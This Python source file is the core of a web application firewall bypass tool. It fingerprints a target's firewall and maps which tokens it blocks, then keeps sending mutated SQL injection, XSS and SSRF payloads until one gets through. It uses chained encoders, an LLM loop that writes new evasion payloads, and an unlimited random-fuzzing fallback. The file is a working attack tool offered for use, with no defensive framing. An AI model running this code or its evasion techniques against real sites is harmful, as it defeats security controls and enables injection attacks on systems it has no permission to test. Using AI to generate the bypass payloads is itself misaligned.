import random
import re
import urllib.parse
import logging
from typing import Dict, List, Any, Optional
from pydantic import BaseModel

from .client import WafClient
from .prober import WafProber, BlockMap
from .mutators.encoder import EncoderMutator
from .mutators.sql import SqlMutator
from .mutators.ssrf import SsrfMutator
from .llm import LlmClient
from .fingerprinter import WafFingerprinter

# Configure logger
logger = logging.getLogger("waf_bypasser.core")

class BypassResult(BaseModel):
    success: bool
    payload: Optional[str] = None
    block_map: Dict[str, List[str]]
    detected_waf: Optional[str] = None
    vuln_type: str
    attempts: int
    log: List[Dict[str, Any]]

class WafBypasser:
    """
    Advanced orchestrator that runs token probing, WAF fingerprinting,
    chained mutations, LLM feedback loops, and falls back to an
    infinite random mutation fuzzing engine.
    """

    def __init__(
        self,
        target_url: str,
        base_payload: str,
        param_name: Optional[str] = None,
        method: str = "GET",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        proxy: Optional[str] = None,
        vuln_type: str = "auto",
        use_llm: bool = False,
        llm_provider: str = "gemini",
        llm_api_key: Optional[str] = None,
        max_llm_iterations: int = 4,
        rate_limit_delay: float = 0.1,
    ):
        self.target_url = target_url
        self.base_payload = base_payload
        self.param_name = param_name
        self.use_llm = use_llm
        self.max_llm_iterations = max_llm_iterations

        # Auto-detect vulnerability type
        self.vuln_type = self._detect_vuln_type(base_payload) if vuln_type == "auto" else vuln_type.lower()

        # Initialize WafClient
        self.client = WafClient(
            base_url=target_url,
            method=method,
            headers=headers,
            cookies=cookies,
            proxy=proxy,
            rate_limit_delay=rate_limit_delay
        )

        # Initialize LLM client
        self.llm_client = None
        if self.use_llm:
            self.llm_client = LlmClient(provider=llm_provider, api_key=llm_api_key)

        self.history: List[Dict[str, Any]] = []
        self.tested_payloads = set()
        self.detected_waf = None

    def _detect_vuln_type(self, payload: str) -> str:
        payload_lower = payload.lower()
        if any(scheme in payload_lower for scheme in ["http://", "https://", "ftp://", "gopher://", "dict://", "file://"]) or payload_lower in ["localhost", "127.0.0.1", "[::1]"]:
            return "ssrf"
        if any(tag in payload_lower for tag in ["<script", "javascript:", "onerror", "onload", "alert(", "confirm(", "prompt(", "<svg", "<iframe"]):
            return "xss"
        if any(sql in payload_lower for sql in ["select", "union", "insert", "delete", "where", "--", "/*", "*/", "sys.user_tables"]):
            return "sql"
        return "generic"

    def run(self) -> BypassResult:
        logger.info(f"Starting advanced run. Detected vulnerability type: {self.vuln_type.upper()}")
        
        # 1. WAF Fingerprinting
        logger.info("Performing baseline WAF fingerprinting request...")
        fingerprint_res = self.client.send_payload(self.base_payload, param_name=self.param_name)
        self.detected_waf = WafFingerprinter.identify(
            status_code=fingerprint_res["status_code"],
            headers=fingerprint_res["headers"],
            body=fingerprint_res["text"]
        )
        if self.detected_waf:
            logger.info(f"Target Firewall Fingerprint: {self.detected_waf}")

        # 2. Probe target and build BlockMap
        prober = WafProber(client=self.client, param_name=self.param_name)
        block_map = prober.probe_all()

        # 3. Generate chained candidates using heuristics
        candidates = self._generate_chained_candidates(self.base_payload, block_map)
        logger.info(f"Generated {len(candidates)} multi-stage nested bypass candidates.")

        # 4. Test chained candidates
        for idx, candidate in enumerate(candidates):
            if candidate in self.tested_payloads:
                continue
            self.tested_payloads.add(candidate)

            logger.debug(f"Testing candidate payload: {repr(candidate)}")
            res = self.client.send_payload(candidate, param_name=self.param_name)
            
            attempt_log = {
                "source": "heuristic_chained",
                "payload": candidate,
                "is_blocked": res["is_blocked"],
                "status_code": res["status_code"],
                "length": res["length"],
            }
            self.history.append(attempt_log)

            if res["success"]:
                logger.info(f"Bypass SUCCESS with chained payload: {repr(candidate)}")
                return BypassResult(
                    success=True,
                    payload=candidate,
                    block_map=block_map.to_dict(),
                    detected_waf=self.detected_waf,
                    vuln_type=self.vuln_type,
                    attempts=len(self.tested_payloads),
                    log=self.history
                )

        # 5. LLM Feedback Loop
        if self.use_llm and self.llm_client and self.llm_client.api_key:
            logger.info("Heuristic mutation pipeline exhausted. Initiating LLM generative feedback loop...")
            last_resp = self.history[-1] if self.history else {"status_code": 403, "length": 0, "text": "Access Denied"}

            iteration = 0
            while True:
                if self.max_llm_iterations > 0 and iteration >= self.max_llm_iterations:
                    logger.info("Reached maximum configured LLM iterations limit. Stopping.")
                    break
                
                if self.max_llm_iterations <= 0 and iteration > 0 and iteration % 20 == 0:
                    logger.warning(f"Fuzzer has run {iteration} LLM iterations without a bypass. Still searching since unlimited mode is enabled...")

                iter_label = f"unlimited_{iteration+1}" if self.max_llm_iterations <= 0 else f"{iteration+1}/{self.max_llm_iterations}"
                logger.info(f"LLM Loop iteration {iter_label}...")

                context_summary = last_resp.copy()
                context_summary["previously_tested_failed_payloads"] = list(self.tested_payloads)[-15:]
                context_summary["detected_waf"] = self.detected_waf

                llm_candidates = self.llm_client.generate_mutations(
                    base_payload=self.base_payload,
                    block_map=block_map.to_dict(),
                    waf_response_summary=context_summary,
                    vuln_type=self.vuln_type
                )

                if not llm_candidates:
                    logger.warning("LLM generated no new mutations.")
                    break

                for candidate in llm_candidates:
                    if candidate in self.tested_payloads:
                        continue
                    self.tested_payloads.add(candidate)

                    logger.info(f"Testing LLM-proposed payload: {repr(candidate)}")
                    res = self.client.send_payload(candidate, param_name=self.param_name)
                    
                    attempt_log = {
                        "source": f"llm_iter_{iteration+1}",
                        "payload": candidate,
                        "is_blocked": res["is_blocked"],
                        "status_code": res["status_code"],
                        "length": res["length"],
                    }
                    self.history.append(attempt_log)

                    if res["success"]:
                        logger.info(f"Bypass SUCCESS with LLM payload: {repr(candidate)}")
                        return BypassResult(
                            success=True,
                            payload=candidate,
                            block_map=block_map.to_dict(),
                            detected_waf=self.detected_waf,
                            vuln_type=self.vuln_type,
                            attempts=len(self.tested_payloads),
                            log=self.history
                        )
                    
                    last_resp = attempt_log
                iteration += 1

        # 6. Fallback Random Fuzzing Loop (if LLM is disabled or fails to bypass)
        # Only trigger this if max_llm_iterations <= 0 (unlimited mode is on)
        if self.max_llm_iterations <= 0:
            logger.warning("Starting fallback Random Evasion Fuzzing loop...")
            iteration = 0
            current_seed = self.base_payload
            
            while True:
                # Every 100 attempts, print status update
                if iteration > 0 and iteration % 100 == 0:
                    logger.warning(f"Fuzzer has sent {iteration} random mutated payloads. Still fuzzing...")
                
                # Pick a random candidate from history as base, or keep current seed
                if self.history and random.random() < 0.3:
                    current_seed = random.choice(self.history)["payload"]
                
                # Mutate seed
                mutated = self._apply_random_mutations(current_seed, block_map)
                
                if mutated in self.tested_payloads:
                    # If duplicate, just mutate again
                    continue
                
                self.tested_payloads.add(mutated)
                logger.info(f"Testing random mutated payload #{iteration+1}: {repr(mutated)}")
                res = self.client.send_payload(mutated, param_name=self.param_name)
                
                attempt_log = {
                    "source": "random_fuzz",
                    "payload": mutated,
                    "is_blocked": res["is_blocked"],
                    "status_code": res["status_code"],
                    "length": res["length"],
                }
                self.history.append(attempt_log)
                
                if res["success"]:
                    logger.info(f"Bypass SUCCESS with random fuzz payload: {repr(mutated)}")
                    return BypassResult(
                        success=True,
                        payload=mutated,
                        block_map=block_map.to_dict(),
                        detected_waf=self.detected_waf,
                        vuln_type=self.vuln_type,
                        attempts=len(self.tested_payloads),
                        log=self.history
                    )
                
                iteration += 1

        # If everything fails
        logger.warning("Failed to bypass WAF. All candidates blocked.")
        return BypassResult(
            success=False,
            payload=None,
            block_map=block_map.to_dict(),
            detected_waf=self.detected_waf,
            vuln_type=self.vuln_type,
            attempts=len(self.tested_payloads),
            log=self.history
        )

    def _generate_chained_candidates(self, base_payload: str, block_map: BlockMap) -> List[str]:
        vuln_mutator = None
        if self.vuln_type == "sql":
            vuln_mutator = SqlMutator()
        elif self.vuln_type == "ssrf":
            vuln_mutator = SsrfMutator()

        encoder = EncoderMutator()

        level_1 = [base_payload]
        if vuln_mutator:
            level_1.extend(vuln_mutator.mutate(base_payload, block_map))
        level_1 = list(set(level_1))

        level_2 = []
        for l1_candidate in level_1:
            level_2.extend(encoder.mutate(l1_candidate, block_map))
        
        return list(set(level_1 + level_2))

    def _apply_random_mutations(self, payload: str, block_map: BlockMap) -> str:
        """
        Applies a random combination of evasion primitives to mutate a payload.
        """
        mutations = [
            self._mutate_random_case,
            self._mutate_random_spaces,
            self._mutate_random_comments,
            self._mutate_random_encoding,
        ]
        
        # Apply 1 to 3 random mutations
        num_mutations = random.randint(1, 3)
        mutated_payload = payload
        
        for _ in range(num_mutations):
            mutator_func = random.choice(mutations)
            mutated_payload = mutator_func(mutated_payload, block_map)
            
        return mutated_payload

    def _mutate_random_case(self, payload: str, block_map: BlockMap) -> str:
        # Swap case of characters randomly
        return "".join(c.upper() if random.random() < 0.3 else c.lower() for c in payload)

    def _mutate_random_spaces(self, payload: str, block_map: BlockMap) -> str:
        # Replace spaces with random alternatives
        space_alts = ["/**/", "+", "%0a", "%09", "%0d"]
        allowed_alts = [a for a in space_alts if not any(block_map.is_blocked(char) for char in a)]
        
        if not allowed_alts:
            return payload
            
        parts = payload.split(" ")
        mutated_parts = []
        for p in parts[:-1]:
            mutated_parts.append(p)
            mutated_parts.append(random.choice(allowed_alts))
        mutated_parts.append(parts[-1])
        
        return "".join(mutated_parts)

    def _mutate_random_comments(self, payload: str, block_map: BlockMap) -> str:
        # Inject comment blocks inside SQL keywords
        keywords = ["union", "select", "from", "where"]
        mutated = payload
        for kw in keywords:
            if kw in mutated.lower() and len(kw) > 2:
                # Find occurrences
                matches = list(re.finditer(kw, mutated, re.IGNORECASE))
                if matches:
                    match = random.choice(matches)
                    start, end = match.span()
                    mid = start + (end - start) // 2
                    
                    # Random comment styles
                    comment_styles = ["/**/", "/*!50000union*/" if kw == "union" else "/*!50000select*/"]
                    comment = random.choice(comment_styles)
                    
                    mutated = mutated[:mid] + comment + mutated[mid:]
        return mutated

    def _mutate_random_encoding(self, payload: str, block_map: BlockMap) -> str:
        # Encode random characters to URL/Unicode
        result = ""
        for char in payload:
            if random.random() < 0.2:
                # URL encode
                result += urllib.parse.quote(char)
            elif random.random() < 0.1:
                # Unicode escape
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result
